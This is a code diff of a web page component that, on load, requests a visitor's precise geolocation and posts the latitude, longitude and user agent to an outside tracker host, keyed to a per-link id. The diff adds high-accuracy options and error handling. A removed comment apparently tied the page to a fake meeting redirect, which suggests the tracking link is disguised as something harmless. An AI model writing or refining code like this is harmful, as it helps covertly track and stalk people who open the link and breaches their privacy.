@@ -30,31 +30,44 @@ const linkId = params.id as string
   useEffect(() => {
     if (!linkId) return
 
-    const trackLocation = async () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-          await fetch('https://tracker-app-eung.onrender.com/save-location', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              linkId,
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              userAgent: navigator.userAgent
-            })
+   const trackLocation = async () => {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        await fetch('https://tracker-app-eung.onrender.com/save-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            linkId,
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            userAgent: navigator.userAgent
           })
-
-
-          // router.push(`/meeting/${linkId}`)
-        }, (error) => {
-          console.error('Geolocation error:', error)
-
         })
-      } else {
-        console.log('Geolocation not supported')
+      },
+      (error) => {
+        switch (error.code) {
+          case error.PERMISSION_DENIED:
+            console.error("User denied the request for Geolocation.")
+            break
+          case error.POSITION_UNAVAILABLE:
+            console.error("Location information is unavailable.")
+            break
+          case error.TIMEOUT:
+            console.error("The request to get user location timed out.")
+            break
+          default:
+            console.error("An unknown error occurred.")
+            break
+        }
+      },
+      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+    )
+  } else {
+    console.error('Geolocation is not supported by this browser.')
+  }
+}
 
-      }
-    }
 
     trackLocation()
   }, [linkId, router])
